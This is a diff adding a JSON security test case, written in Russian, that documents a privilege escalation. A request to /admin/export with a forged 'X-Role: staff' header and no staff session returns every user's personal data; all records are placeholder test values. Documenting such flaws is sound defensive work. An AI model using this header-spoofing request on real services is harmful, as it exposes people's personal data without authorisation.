@@ -1,0 +1,21 @@
+{
+  "name": "05_role_header_escalation",
+  "title": "Эскалация: доверие заголовку X-Role",
+  "request": "GET /admin/export с заголовком X-Role: staff (без сессии сотрудника)",
+  "status": 200,
+  "response": [
+    {
+      "id": 1,
+      "name": "TEST_ALICE",
+      "email": "alice@example.invalid",
+      "address": "TEST_ADDRESS_A"
+    },
+    {
+      "id": 2,
+      "name": "TEST_BOB",
+      "email": "bob@example.invalid",
+      "address": "TEST_ADDRESS_B"
+    }
+  ],
+  "verdict": "Экспорт всех ПДн по подделанному заголовку роли"
+}
